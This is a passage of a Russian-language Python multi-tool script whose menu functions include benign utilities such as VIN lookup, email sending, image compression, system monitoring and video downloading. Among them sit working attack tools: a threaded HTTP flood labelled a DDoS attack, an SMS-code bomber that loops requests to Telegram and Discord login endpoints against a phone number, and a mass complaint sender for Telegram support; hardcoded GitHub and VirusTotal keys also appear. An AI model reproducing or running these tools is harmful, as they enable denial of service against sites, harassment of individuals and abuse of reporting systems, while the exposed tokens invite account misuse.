        print(Colorate.Horizontal(Colors.green_to_white, f"Сокращенный URL: {short_url}"))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, "Ошибка при сокращении URL"))
    

    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def search_vehicle_by_vin():
    clear_console()
    
    vin = input(Colorate.Horizontal(Colors.green_to_white, "Введите VIN автомобиля: "))
    url = f"https://vpic.nhtsa.dot.gov/api/vehicles/DecodeVINValuesBatch/"
    data = {
        "format":
        "json",
        "data": [vin]
    }

    response = requests.post(url, json=data)
    vehicle_data = response.json().get("Results", [{}])[0]
    
    if vehicle_data.get("ErrorCode") == "0":
        make = vehicle_data.get("Make", "Неизвестно")
        model = vehicle_data.get("Model", "Неизвестно")
        year = vehicle_data.get("ModelYear", "Неизвестно")
        
        print(Colorate.Horizontal(Colors.green_to_white, f"Марка: {make}\nМодель: {model}\nГод выпуска: {year}"))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, "Информация по данному VIN не найдена"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def send_email():
    clear_console()
    
    sender_email = input(Colorate.Horizontal(Colors.green_to_white, "Введите ваш email: "))
    sender_password = input(Colorate.Horizontal(Colors.green_to_white, "Введите ваш пароль: "))
    recipient_email = input(Colorate.Horizontal(Colors.green_to_white, "Введите email получателя: "))
    subject = input(Colorate.Horizontal(Colors.green_to_white, "Введите тему письма: "))
    body = input(Colorate.Horizontal(Colors.green_to_white, "Введите текст письма: "))
    
    msg = MIMEMultipart()
    msg['From'] = sender_email
    msg['To'] = recipient_email
    msg['Subject'] = subject
    msg.attach(MIMEText(body, 'plain'))
    
    try:
        server = smtplib.SMTP('smtp.gmail.com', 587)
        server.starttls()
        server.login(sender_email, sender_password)
        server.sendmail(sender_email, recipient_email, msg.as_string())
        server.close()
        print(Colorate.Horizontal(Colors.green_to_white, "Письмо успешно отправлено"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при отправке письма: {e}"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def base64_process():

    action = input("Выберите действие (encode для шифрования, decode для дешифрования): ").strip().lower()
    if action not in ['encode', 'decode']:
        print("Неверное действие. Пожалуйста, выберите 'encode' или 'decode'.")
        return
    
    input_text = input("Введите текст: ").strip()

    if action == 'encode':

        encoded_bytes = base64.b64encode(input_text.encode('utf-8'))
        encoded_str = encoded_bytes.decode('utf-8')
        output_text = f"Закодированный текст: {encoded_str}"
    elif action == 'decode':
        try:

            decoded_bytes = base64.b64decode(input_text.encode('utf-8'))
            decoded_str = decoded_bytes.decode('utf-8')
            output_text = f"Декодированный текст: {decoded_str}"
        except Exception as e:
            output_text = "Ошибка декодирования. Убедитесь, что ввод соответствует формату Base64."

    print(Colorate.Horizontal(Colors.green_to_white, output_text))

def ddos_attack():
    link = input(Colorate.Horizontal(Colors.green_to_white, "\nВведите ссылку для DDoS атаки: "))
    num_threads = int(input(Colorate.Horizontal(Colors.green_to_white, "Введите количество потоков: ")))
    attack_duration = int(input(Colorate.Horizontal(Colors.green_to_white, "Введите длительность атаки (в секундах): ")))

    def send_request():
        session = requests.Session()
        while time.time() < end_time:
            try:
                session.get(link)
                print(f"{COLOR_CODE['GREEN']}Запрос отправлен на {link}{COLOR_CODE['RESET']}")
            except requests.RequestException:
                print(f"{COLOR_CODE['RED']}Ошибка при отправке запроса на {link}{COLOR_CODE['RESET']}")

    end_time = time.time() + attack_duration
    threads = []

    for _ in range(num_threads):
        thread = threading.Thread(target=send_request)
        threads.append(thread)
        thread.start()

    for thread in threads:
        thread.join()

    print(Colorate.Horizontal(Colors.green_to_white, "\nDDoS атака завершена"))

headers = {
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64)',
    'Content-Type': 'application/x-www-form-urlencoded'
}

def initiate_dos_attack():
    clear_console()
    phone_number = input("Введите номер телефона : ")
    print("\n Отправляются коды .. \n")
    print("\n Что бы остановить CTRL + C \n")
    perform_attack(phone_number)

def perform_attack(phone_number):
    iteration = 0
    try:
        while True:
            time.sleep(1)
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': phone_number})
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': phone_number})
            requests.post('https://my.telegram.org/auth/send_password', headers=headers, data={'phone': phone_number})
            requests.get('https://telegram.org/support?setln=ru', headers=headers)
            requests.post('https://my.telegram.org/auth/', headers=headers, data={'phone': phone_number})
            requests.post('https://discord.com/api/v9/auth/register/phone', headers=headers, data={"phone": phone_number})
            iteration += 1
            print(Fore.WHITE + f" Коды успешно отправлены!")
            print(Fore.WHITE + f" Всего кругов отправлено: {iteration}")
    except Exception as e:
        print(Fore.RED + f'Произошла ошибка: {e}')

def upload_to_gist():
    os.system('cls' if os.name == 'nt' else 'clear')
    
    print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Файл должен быть до 100 МБ.")))

    token = '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'
    gist_url = 'https://api.github.com/gists'

    def list_files():
        files = [f for f in os.listdir() if os.path.isfile(f)]
        if not files:
            print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Нет файлов в текущей директории.")))
        else:
            print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Файлы в текущей директории:")))
            for idx, file in enumerate(files):
                print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(f"{idx + 1}. {file}")))
        return files

    choice = input(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Вы хотите загрузить файл из текущей директории (1) или указать путь к файлу (2)? Введите 1 или 2: ")).strip())
    
    if choice == '1':
        files = list_files()
        if files:
            file_index = int(input(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Выберите номер файла для загрузки: ")).strip())) - 1
            if 0 <= file_index < len(files):
                file_path = files[file_index]
            else:
                print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Неверный номер файла.")))
                return
    elif choice == '2':
        file_path = input(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Введите путь к файлу: ")).strip())
        if not os.path.isfile(file_path):
            print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Файл не найден.")))
            return
    else:
        print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Неверный выбор.")))
        return

    description = input(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Введите описание для Gist: ")).strip())

    with open(file_path, 'r') as file:
        file_content = file.read()

    data = {
        "description": description,
        "public": True,
        "files": {
            os.path.basename(file_path): {
                "content": file_content
            }
        }
    }

    headers = {
        'Authorization': f'token {token}',
        'Accept': 'application/vnd.github.v3+json'
    }

    response = requests.post(gist_url, json=data, headers=headers)

    if response.status_code == 201:
        gist_url = response.json().get('html_url')
        print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(f"Файл успешно загружен в Gist: {gist_url}")))
    else:
        print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(f"Не удалось создать Gist. Статус код: {response.status_code}")))
        print(Colorate.Horizontal(Colors.green_to_white, Center.XCenter(response.json())))

    input(Colorate.Horizontal(Colors.green_to_white, Center.XCenter("Нажмите Enter для продолжения...")))

def compress_image():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Сжатие изображений"))

    choice = input(Colorate.Horizontal(Colors.green_to_white, "Вы хотите выбрать файл из текущей директории (1) или указать путь к файлу (2)? Введите 1 или 2: "))

    if choice == '1':
        print(Colorate.Horizontal(Colors.green_to_white, "Файлы в текущей директории:"))
        files = [f for f in os.listdir() if f.lower().endswith(('png', 'jpg', 'jpeg'))]
        for idx, file in enumerate(files, 1):
            print(Colorate.Horizontal(Colors.green_to_white, f"{idx}. {file}"))
        
        file_choice = int(input(Colorate.Horizontal(Colors.green_to_white, "Выберите номер файла для сжатия: ")))
        file_path = files[file_choice - 1]
    elif choice == '2':
        file_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите полный путь к файлу: "))
    else:
        print(Colorate.Horizontal(Colors.green_to_white, "Неверный выбор. Попробуйте снова."))
        return

    try:
        img = Image.open(file_path)
        if img.mode == 'RGBA':
            img = img.convert('RGB')
        output_path = os.path.splitext(file_path)[0] + "_compressed.jpg"
        img.save(output_path, "JPEG", optimize=True, quality=10)
        print(Colorate.Horizontal(Colors.green_to_white, f"Изображение успешно сжато и сохранено как {output_path}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.green_to_white, f"Ошибка при сжатии изображения: {str(e)}"))

    input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter для продолжения..."))

def github_repo_parser(url):
    clear_console()
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Парсинг информации о репозитории GitHub"))

    try:
        repo_api_url = url.replace("github.com", "api.github.com/repos")
        response = requests.get(repo_api_url, timeout=10)
        response.raise_for_status()
        repo_info = response.json()
        
        repo_name = repo_info.get('name', 'Неизвестно')
        repo_owner = repo_info.get('owner', {}).get('login', 'Неизвестно')
        repo_description = repo_info.get('description', 'Нет описания')
        repo_language = repo_info.get('language', 'Язык не указан')
        repo_stars = repo_info.get('stargazers_count', 0)
        repo_forks = repo_info.get('forks_count', 0)
        repo_update_date = repo_info.get('updated_at', 'Дата обновления не указана')

        repo_info_content = (
            f"Название репозитория: {repo_name}\n"
            f"Владелец: {repo_owner}\n"
            f"Описание: {repo_description}\n"
            f"Язык: {repo_language}\n"
            f"Звезды: {repo_stars}\n"
            f"Форки: {repo_forks}\n"
            f"Дата последнего обновления: {repo_update_date}\n"
        )

        repo_info_file_name = f"{repo_name}_repo_info.txt"
        with open(repo_info_file_name, 'w', encoding='utf-8') as file:
            file.write(repo_info_content)

        print(Colorate.Horizontal(Colors.green_to_white, f"Информация о репозитории сохранена в {repo_info_file_name}"))
    except requests.exceptions.RequestException as e:
        print(Colorate.Horizontal(Colors.green_to_white, f"Ошибка при запросе: {str(e)}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.green_to_white, f"Неизвестная ошибка: {str(e)}"))

    input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter для продолжения..."))

def html_parser(url):
    clear_console()
    max_retries = 3
    retry_delay = 5   


    def sanitize_filename(filename):
        return re.sub(r'[\\/*?:"<>|]', "_", filename)

    for attempt in range(max_retries):
        try:
            response = requests.get(url, timeout=10)
            response.raise_for_status()
            soup = BeautifulSoup(response.content, 'html.parser')
            file_name = sanitize_filename(f"{url.replace('https://', '').replace('http://', '').replace('/', '_')}.html")
            with open(file_name, 'w', encoding='utf-8') as file:
                file.write(soup.prettify())
            print(f"HTML content saved to {file_name}")
            break
        except requests.exceptions.Timeout:
            print(f"Failed to parse HTML for {url}: Request timed out.")
        except requests.exceptions.HTTPError as e:
            if response.status_code == 429:
                if attempt < max_retries - 1:
                    print(f"Failed to parse HTML for {url}: {e}. Retrying in {retry_delay} seconds...")
                    time.sleep(retry_delay)
                else:
                    print(f"Failed to parse HTML for {url}: {e}. Max retries reached.")
            else:
                print(f"Failed to parse HTML for {url}: {e}")
                break
        except requests.exceptions.RequestException as e:
            print(f"Failed to parse HTML for {url}: {e}")
            break
        except OSError as e:
            print(f"Failed to save HTML for {url}: {e}")
            break
    input("Press Enter to return to the menu...")

def system_monitor():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Мониторинг системы"))

    cpu_usage = psutil.cpu_percent()
    memory_usage = psutil.virtual_memory().percent
    disk_usage = psutil.disk_usage("/").percent

    print(Colorate.Horizontal(Colors.green_to_white, f"Использование CPU: {cpu_usage}%"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Использование памяти: {memory_usage}%"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Использование диска: {disk_usage}%"))

    input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter для продолжения..."))

def process_list():
    os.system('cls' if os.name == 'nt' else 'clear')
    print(Colorate.Horizontal(Colors.green_to_white, "Список запущенных процессов"))

    for proc in psutil.process_iter(['pid', 'name']):
        print(Colorate.Horizontal(Colors.green_to_white, f"PID: {proc.info['pid']} - Имя: {proc.info['name']}"))

    input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter для продолжения..."))

def reporter_tg():
    clear_console()
    text = input(Colorate.Horizontal(Colors.green_to_blue," Введите текст жалобы: "))
    num_complaints = input(Colorate.Horizontal(Colors.green_to_blue,"\n Введите количество жалоб для отправки: "))
    if num_complaints.isdigit():
        num_complaints = int(num_complaints)
    else:
        print(colored("Ошибка: Введите целое число.", 'red'))
        return

    print()

    with open('num.txt', 'r') as num_file:
        contacts = num_file.read().splitlines()

    with open('ua.txt', 'r') as ua_file:
        ua_list = ua_file.read().splitlines()

    url = 'https://telegram.org/support'
    yukino = 0
    success_count = 0
    failure_count = 0
    max_retries = 3

    async def send_complaint(session, text, contact, ua_list):
        nonlocal yukino, success_count, failure_count

        headers = {
            'User-Agent': random.choice(ua_list)
        }
        payload = {
            'text': text,
            'contact': contact
        }

        for attempt in range(max_retries):
            try:
                async with session.post(url, data=payload, headers=headers, timeout=10) as response:
                    if response.status == 200:
                        yukino += 1
                        success_count += 1
                        print(colored(f" Жалоба успешно отправлена: {yukino}", 'green'))
                        return
            except aiohttp.ClientError:
                pass
            except asyncio.TimeoutError:
                pass

        failure_count += 1
        print(colored(" Не удалось отправить жалобу после нескольких попыток", 'red'))

    async def run_tasks(num_complaints, text):
        async with aiohttp.ClientSession() as session:
            tasks = []
            for i in range(num_complaints):
                chosen_contact = random.choice(contacts)
                tasks.append(send_complaint(session, text, chosen_contact, ua_list))
            await asyncio.gather(*tasks)

    asyncio.run(run_tasks(num_complaints, text))
    print()

    print(colored(f" Успешно отправлено жалоб: {success_count}", 'green'))
    print(colored(f" Не удалось отправить жалоб: {failure_count}", 'red'))
    print()

def py_to_exe():
    clear_console()
    def choose_file(extension, prompt):
        print(f"[1] Выбрать файл с расширением {extension} из текущей директории")
        print("[2] Указать полный путь к файлу")
        choice = input(prompt).strip()
        
        if choice == '1':
            files = [f for f in os.listdir() if f.endswith(extension)]
            if not files:
                print(f"Ошибка: файлы с расширением {extension} не найдены в текущей директории.")
                return None
            print("Доступные файлы:")
            for i, file in enumerate(files, start=1):
                print(f"[{i}] {file}")
            file_choice = int(input("Выберите файл по номеру: ").strip()) - 1
            return os.path.abspath(files[file_choice])
        elif choice == '2':
            return input(f"Введите полный путь к файлу с расширением {extension}: ").strip()

    py_file = choose_file('.py', "Выберите способ выбора файла .py:")
    if not py_file or not os.path.isfile(py_file):
        print(f"Ошибка: файл {py_file} не найден.")
        return

    one_file = input("Создать exe одним файлом? (y/n): ").strip().lower() == 'y'
    icon_needed = input("Нужна ли иконка для файла exe? (y/n): ").strip().lower() == 'y'
    icon_file = None
    if icon_needed:
        icon_file = choose_file('.ico', "Выберите способ выбора файла .ico:")
        if not icon_file or not os.path.isfile(icon_file):
            print(f"Ошибка: файл иконки {icon_file} не найден.")
            return

    hidden_console = input("Скрыть консоль? (y/n): ").strip().lower() == 'y'
    output_name = input("Введите имя выходного файла (или оставьте пустым для стандартного имени): ").strip()

    cmd = ['pyinstaller', py_file]
    if one_file:
        cmd.append('--onefile')
    if icon_file:
        cmd.extend(['--icon', icon_file])
    if hidden_console:
        cmd.append('--noconsole')
    if output_name:
        cmd.extend(['--name', output_name])
    
    try:
        print(f"Запуск команды: {' '.join(cmd)}")
        subprocess.run(cmd, check=True)
        print("Файл .exe создан.")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при выполнении команды: {e}")
    except Exception as e:
        print(f"Неожиданная ошибка: {e}")

def network_traffic_monitor():
    clear_console()
    net_io = psutil.net_io_counters()
    sent = net_io.bytes_sent / (1024 ** 2)   
    received = net_io.bytes_recv / (1024 ** 2)   

    print(f"Отправлено данных: {sent:.2f} МБ")
    print(f"Получено данных: {received:.2f} МБ")

def system_usage_monitor():
    clear_console()
    cpu_usage = psutil.cpu_percent(interval=1)
    memory_info = psutil.virtual_memory()
    total_memory = memory_info.total / (1024 ** 3)  
    used_memory = memory_info.used / (1024 ** 3)  
    memory_percentage = memory_info.percent

    print(f"Использование процессора: {cpu_usage}%")
    print(f"Используемая память: {used_memory:.2f} ГБ из {total_memory:.2f} ГБ ({memory_percentage}%)")

def disk_usage_monitor():
    clear_console()
    disk_info = psutil.disk_usage('/')
    total_disk = disk_info.total / (1024 ** 3)  
    used_disk = disk_info.used / (1024 ** 3)   
    free_disk = disk_info.free / (1024 ** 3)   
    disk_percentage = disk_info.percent

    print(f"Общее дисковое пространство: {total_disk:.2f} ГБ")
    print(f"Используемое дисковое пространство: {used_disk:.2f} ГБ ({disk_percentage}%)")
    print(f"Свободное дисковое пространство: {free_disk:.2f} ГБ")

def check_package_updates():
    clear_console()
    try:
        result = subprocess.run(['pip', 'list', '--outdated'], capture_output=True, text=True)
        if result.stdout:
            print("Доступны обновления для следующих пакетов:")
            print(result.stdout)
        else:
            print("Все пакеты обновлены.")
    except subprocess.CalledProcessError as e:
        print(f"Ошибка при проверке обновлений пакетов: {e}")

def choose_file(extension, prompt):
    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, prompt))
    print(Colorate.Horizontal(Colors.green_to_white, f"[1] Выбрать файл с расширением {extension} из текущей директории"))
    print(Colorate.Horizontal(Colors.green_to_white, "[2] Указать полный путь к файлу"))
    choice = input(Colorate.Horizontal(Colors.green_to_white, "Ваш выбор: "))
    
    if choice == '1':
        files = [f for f in os.listdir() if f.endswith(extension)]
        if not files:
            print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка: файлы с расширением {extension} не найдены в текущей директории."))
            return None
        print(Colorate.Horizontal(Colors.green_to_white, "Доступные файлы:"))
        for i, file in enumerate(files, start=1):
            print(Colorate.Horizontal(Colors.green_to_white, f"[{i}] {file}"))
        file_choice = int(input(Colorate.Horizontal(Colors.green_to_white, "Выберите файл по номеру: "))) - 1
        return os.path.abspath(files[file_choice])
    elif choice == '2':
        return input(Colorate.Horizontal(Colors.green_to_white, f"Введите полный путь к файлу с расширением {extension}: "))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, "Ошибка: Неправильный выбор."))
        return None

def check_virus_total():
    clear_console()
    
    file_path = choose_file('.py', "Выберите способ выбора файла:")
    if not file_path or not os.path.isfile(file_path):
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка: файл {file_path} не найден."))
        input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter для возврата в меню..."))
        return
    
    api_keys = [
        "9497fc0c4de5661dd66dbd8d63878be1a821a7c322427c05fabb515ec22e6e8b"
        
    ]
    
    def get_virus_total_status(api_key):
        headers = {
            'x-apikey': api_key
        }
        files = {
            'file': (os.path.basename(file_path), open(file_path, 'rb'))
        }
        response = requests.post('https://www.virustotal.com/api/v3/files', headers=headers, files=files)
        if response.status_code == 200:
            file_id = response.json().get('data', {}).get('id')
            if file_id:
                return file_id
        elif response.status_code == 403:
            print(Colorate.Horizontal(Colors.red_to_white, "Ошибка: Доступ запрещен. Проверьте ваш API-ключ."))
        elif response.status_code == 429:
            print(Colorate.Horizontal(Colors.red_to_white, "Ошибка: Лимит запросов превышен. Попробуйте позже."))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка: {response.status_code} - {response.text}"))
        return None
    
    file_id = None
    for api_key in api_keys:
        file_id = get_virus_total_status(api_key)
        if file_id:
            break
    
    if not file_id:
        print(Colorate.Horizontal(Colors.red_to_white, "Не удалось загрузить файл на VirusTotal с использованием доступных API-ключей."))
        input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter для возврата в меню..."))
        return

    print(Colorate.Horizontal(Colors.green_to_white, f"Файл загружен. Идентификатор файла: {file_id}"))
    print(Colorate.Horizontal(Colors.green_to_white, f"Результаты проверки можно посмотреть на VirusTotal по этому ID: https://www.virustotal.com/gui/file/{file_id}"))
    
    
    for api_key in api_keys:
        headers = {
            'x-apikey': api_key
        }
        report_response = requests.get(f'https://www.virustotal.com/api/v3/files/{file_id}', headers=headers)
        if report_response.status_code == 200:
            report_data = report_response.json()
            attributes = report_data.get('data', {}).get('attributes', {})
            scan_results = attributes.get('last_analysis_results', {})
            
            print(Colorate.Horizontal(Colors.green_to_white, f"\nНазвание файла: {os.path.basename(file_path)}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Тип файла: {attributes.get('type_description', 'Неизвестно')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Размер файла: {attributes.get('size', 'Неизвестно')} bytes"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Общее количество нахождений: {sum([result.get('category') == 'malicious' for result in scan_results.values()])}"))
            
            for engine, result in scan_results.items():
                engine_name = result.get('engine_name', engine)
                category = result.get('category', 'Неизвестно')
                print(Colorate.Horizontal(Colors.green_to_white, f"{engine_name}: {category}"))
            
            is_safe = all(result.get('category') != 'malicious' for result in scan_results.values())
            print(Colorate.Horizontal(Colors.green_to_white, f"\nФайл {'безопасен' if is_safe else 'небезопасен'}"))
            break
        elif report_response.status_code == 403:
            print(Colorate.Horizontal(Colors.red_to_white, "Ошибка: Доступ запрещен к отчету. Проверьте ваш API-ключ."))
            break
        elif report_response.status_code == 429:
            print(Colorate.Horizontal(Colors.red_to_white, "Ошибка: Лимит запросов превышен. Попробуйте позже."))
            break
        else:
            print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при получении отчета: {report_response.status_code} - {report_response.text}"))
    
    input(Colorate.Horizontal(Colors.green_to_white, "Нажмите Enter для возврата в меню..."))

def check_ssl_cert():
    def get_ssl_info(hostname):
        context = ssl.create_default_context()
        with socket.create_connection((hostname, 443)) as sock:
            with context.wrap_socket(sock, server_hostname=hostname) as ssock:
                cert = ssock.getpeercert()
                return cert

    url = input(Colorate.Horizontal(Colors.green_to_white, "Введите URL для проверки SSL-сертификата: "))
    parsed_url = urlparse(url)
    hostname = parsed_url.hostname if parsed_url.hostname else url

    try:
        cert_info = get_ssl_info(hostname)
        if cert_info:
            issuer = dict(x[0] for x in cert_info.get('issuer'))
            issued_to = dict(x[0] for x in cert_info.get('subject'))
            valid_from = datetime.strptime(cert_info['notBefore'], '%b %d %H:%M:%S %Y %Z')
            valid_to = datetime.strptime(cert_info['notAfter'], '%b %d %H:%M:%S %Y %Z')

            print(Colorate.Horizontal(Colors.green_to_white, f"Сертификат выдан: {issuer.get('organizationName', 'N/A')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Сертификат выдан для: {issued_to.get('commonName', 'N/A')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Сертификат действует с: {valid_from.strftime('%Y-%m-%d')}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Сертификат действует до: {valid_to.strftime('%Y-%m-%d')}"))

            if datetime.now() < valid_to:
                print(Colorate.Horizontal(Colors.green_to_white, "SSL-сертификат действителен."))
            else:
                print(Colorate.Horizontal(Colors.red_to_white, "SSL-сертификат истек."))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, "Не удалось получить информацию о сертификате."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при проверке SSL-сертификата: {e}"))

def get_whois_info():
    domain = input(Colorate.Horizontal(Colors.green_to_white, "Введите домен для получения информации WHOIS: "))
    try:
        w = whois.whois(domain)
        print(Colorate.Horizontal(Colors.green_to_white, f"Домен: {w.domain_name}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"Регистратор: {w.registrar}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"Дата создания: {w.creation_date}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"Дата окончания: {w.expiration_date}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"Контактное лицо: {w.name}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"Организация: {w.org}"))
        print(Colorate.Horizontal(Colors.green_to_white, f"Страна: {w.country}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при получении информации WHOIS: {e}"))

def get_ip_location():
    ip = input(Colorate.Horizontal(Colors.green_to_white, "Введите IP-адрес для определения местоположения: "))
    try:
        response = requests.get(f"http://ip-api.com/json/{ip}")
        data = response.json()
        if data['status'] == 'success':
            print(Colorate.Horizontal(Colors.green_to_white, f"Страна: {data['country']}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Регион: {data['regionName']}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Город: {data['city']}"))
            print(Colorate.Horizontal(Colors.green_to_white, f"Провайдер: {data['isp']}"))
        else:
            print(Colorate.Horizontal(Colors.red_to_white, "Не удалось получить данные о местоположении."))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при получении данных: {e}"))

class FileChangeHandler(FileSystemEventHandler):
    def on_modified(self, event):
        print(Colorate.Horizontal(Colors.green_to_white, f"Файл изменен: {event.src_path}"))
    def on_created(self, event):
        print(Colorate.Horizontal(Colors.green_to_white, f"Файл создан: {event.src_path}"))
    def on_deleted(self, event):
        print(Colorate.Horizontal(Colors.red_to_white, f"Файл удален: {event.src_path}"))

def monitor_file_activity():
    path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к директории для мониторинга: "))
    event_handler = FileChangeHandler()
    observer = Observer()
    observer.schedule(event_handler, path, recursive=True)
    observer.start()
    print(Colorate.Horizontal(Colors.green_to_white, f"Мониторинг изменений в {path}..."))
    try:
        while True:
            time.sleep(1)
    except KeyboardInterrupt:
        observer.stop()
    observer.join()

def convert_pdf_to_word():
    pdf_file = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к PDF файлу: "))
    docx_file = input(Colorate.Horizontal(Colors.green_to_white, "Введите имя для выходного файла DOCX: "))

    if not docx_file.endswith('.docx'):
        docx_file += '.docx'

    try:
        cv = Converter(pdf_file)
        cv.convert(docx_file, start=0, end=None)
        cv.close()
        print(Colorate.Horizontal(Colors.green_to_white, f"Файл успешно конвертирован и сохранен как {docx_file}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при конвертации файла: {e}"))

def find_and_remove_duplicates(directory):
    file_hashes = {}
    duplicates = []

    print(Colorate.Horizontal(Colors.green_to_white, "Поиск дубликатов файлов..."))

    for dirpath, _, filenames in os.walk(directory):
        for file in filenames:
            file_path = os.path.join(dirpath, file)
            with open(file_path, 'rb') as f:
                file_hash = hashlib.md5(f.read()).hexdigest()
            if file_hash in file_hashes:
                duplicates.append(file_path)
            else:
                file_hashes[file_hash] = file_path

    if duplicates:
        print(Colorate.Horizontal(Colors.red_to_white, "Найдены дубликаты файлов:"))
        for dup in duplicates:
            print(Colorate.Horizontal(Colors.red_to_white, dup))
            os.remove(dup)
        print(Colorate.Horizontal(Colors.green_to_white, "Все дубликаты удалены."))
    else:
        print(Colorate.Horizontal(Colors.green_to_white, "Дубликатов не найдено."))

def extract_text_from_image():
    image_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к изображению: "))
    
    try:
        img = Image.open(image_path)
        text = pytesseract.image_to_string(img)
        print(Colorate.Horizontal(Colors.green_to_white, "Извлеченный текст:"))
        print(text)
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при извлечении текста: {e}"))

def parse_json_file():
    file_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь к JSON файлу: "))
    
    try:
        with open(file_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        
        print(Colorate.Horizontal(Colors.green_to_white, "Данные из JSON файла:"))
        print(json.dumps(data, indent=4, ensure_ascii=False))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при парсинге JSON файла: {e}"))

def download_youtube_video():
    url = input(Colorate.Horizontal(Colors.green_to_white, "Введите URL видео на YouTube: "))
    save_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь для сохранения видео: "))

    try:
        yt = YouTube(url)
        stream = yt.streams.get_highest_resolution()
        stream.download(output_path=save_path)
        print(Colorate.Horizontal(Colors.green_to_white, f"Видео '{yt.title}' успешно скачано в {save_path}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при скачивании видео: {e}"))

def download_tiktok_video():
    video_url = input(Colorate.Horizontal(Colors.green_to_white, "Введите URL видео TikTok: "))
    save_path = input(Colorate.Horizontal(Colors.green_to_white, "Введите путь для сохранения видео: "))

    try:
        api = TikTokApi.get_instance()
        video_id = video_url.split('/')[-1].split('?')[0]
        video = api.video(id=video_id)
        video_data = video.bytes()

        with open(save_path, 'wb') as f:
            f.write(video_data)
        
        print(Colorate.Horizontal(Colors.green_to_white, f"Видео успешно скачано в {save_path}"))
    except Exception as e:
        print(Colorate.Horizontal(Colors.red_to_white, f"Ошибка при скачивании видео: {e}"))

def list_installed_programs():
    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, "Установленные программы:\n"))
    if platform.system() == 'Windows':
        programs = os.popen('wmic product get name').read().splitlines()
        for program in programs[1:]:
            print(Colorate.Horizontal(Colors.green_to_white, program.strip()))
    else:
        print(Colorate.Horizontal(Colors.red_to_white, "Функция поддерживается только на Windows."))
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def get_network_connections():
    clear_console()
    print(Colorate.Horizontal(Colors.green_to_white, "Сетевые подключения:\n"))
    connections = psutil.net_connections()
    for conn in connections:
        print(Colorate.Horizontal(Colors.green_to_white, f"Локальный адрес: {conn.laddr}, Удаленный адрес: {conn.raddr}, Статус: {conn.status}"))
    input(Colorate.Horizontal(Colors.green_to_white, "\nНажмите Enter для возврата в меню..."))

def get_os_info():
    clear_console()
    os_info = platform.uname()
